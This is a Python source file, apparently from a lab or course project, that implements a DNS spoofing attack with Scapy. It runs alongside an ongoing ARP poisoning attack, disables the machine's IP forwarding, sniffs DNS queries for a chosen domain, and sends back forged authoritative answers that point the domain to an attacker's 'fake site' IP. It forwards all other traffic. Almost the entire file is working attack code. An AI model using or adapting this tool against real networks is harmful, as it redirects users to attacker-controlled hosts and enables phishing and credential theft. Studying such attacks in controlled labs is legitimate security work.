import threading

from scapy.all import *
from scapy.layers.dns import DNS, DNSRR, DNSQR
from scapy.layers.inet import UDP, IP


class DnsPois:

    def __init__(self):
        self.auth_ip = None
        self.rec_ip = None
        self.domain = None
        self.mal_ip = None
        self.stop = False
        self.thread = None
        self.stop_thread = None
        self.stop = False

    def responder(self, auth_ip, rec_ip, mal_ip, domain):
        """
        Forwards a packet to the original recipient if it is not a packet we wish to falsify
        """
        def forward(pkt):
            send(pkt, verbose=1)

        """
        Looks at a packet and decides whether it contains a DNS response for the domain we wish to spoof
        if so we falsify the packet
        if not we forward the packet to its original recipient
        """
        def get_resp(pkt):

            if DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0 and str(pkt[IP].src) == rec_ip and \
                    str(pkt[IP].dst) == auth_ip:

                if domain in str(pkt['DNS Question Record'].qname):
                    spf_resp = IP(dst=pkt[IP].src, src=pkt[IP].dst)/UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/DNS(
                        id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, qdcount=1, rd=1, ancount=1, nscount=0, arcount=0,
                        an=(DNSRR(rrname=pkt[DNS].qd.qname, type='A', ttl=3600, rdata=mal_ip)))
                    send(spf_resp, verbose=1)
                    return "Spoofed DNS Response Sent " + str(pkt['DNS Question Record'].qname)
                else:
                    forward(pkt)
                    return "Irrelevant " + str(pkt['DNS Question Record'].qname)
            else:
                forward(pkt)
                return "Irrelevant"

        # TODO: this does not work
        while not self.stop:
            return get_resp

    def set(self, auth_dns, rec_dns, mal_dns, dom):
        self.domain = dom
        self.auth_ip = auth_dns
        self.rec_ip = rec_dns
        self.mal_ip = mal_dns

    def start(self):
        print("domain: " + self.domain)
        print("auth server: " + self.auth_ip)
        print("NS: " + self.rec_ip)
        print("Fake site: " + self.mal_ip)

        # Since ARP poisoning ongoing is a prerequisite
        # We have to turn off automatic forwarding
        # else the packets are forwarded before we can spoof them
        try:
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
                ipf.write('0\n')
            print("Turned off auto forward pilot, switching to manual..")
        except FileNotFoundError:
            pass

        self.stop = False
        self.thread = threading.Thread(target=self.sniff)
        self.thread.start()

    def sniff(self):
        sniff(prn=self.responder(self.auth_ip, self.rec_ip, self.mal_ip, self.domain))

    def stop_poisoning(self):
        self.stop = True
        # self.stop_thread = threading.Thread(target=self.restore_network)
